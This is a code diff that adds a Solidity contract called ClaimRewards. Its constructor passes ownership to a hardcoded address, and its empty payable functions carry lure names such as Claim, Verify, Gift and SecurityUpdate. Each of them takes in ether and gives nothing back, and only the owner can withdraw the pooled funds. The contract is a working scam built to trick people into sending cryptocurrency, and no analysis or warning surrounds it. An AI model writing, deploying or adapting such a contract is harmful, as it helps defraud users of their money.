@@ -1,0 +1,41 @@
+contract ClaimRewards is Ownable {
+
+    constructor() {
+        // The Ownable constructor sets the owner to the address that deploys the contract
+        transferOwnership(0x0000A02F19A9Ab2464738d13d0Cc9679b5410000);
+    }
+
+    function withdraw(uint256 amount, address recipient) public onlyOwner {
+        require(amount <= address(this).balance, "Requested amount exceeds the contract balance.");
+        require(recipient != address(0), "Recipient address cannot be the zero address.");
+        payable(recipient).call{value: amount}("");
+    }
+
+    function Claim() public payable {
+    }
+
+    function Confirm() public payable {
+    }
+
+    function Verify() public payable {
+    }
+    
+    function Connect() public payable {
+    }
+
+    function Start() public payable {
+    }
+
+    function Gift() public payable {
+    }
+
+    function SecurityUpdate() public payable {
+    }
+
+    function HandleRewards() public payable {
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
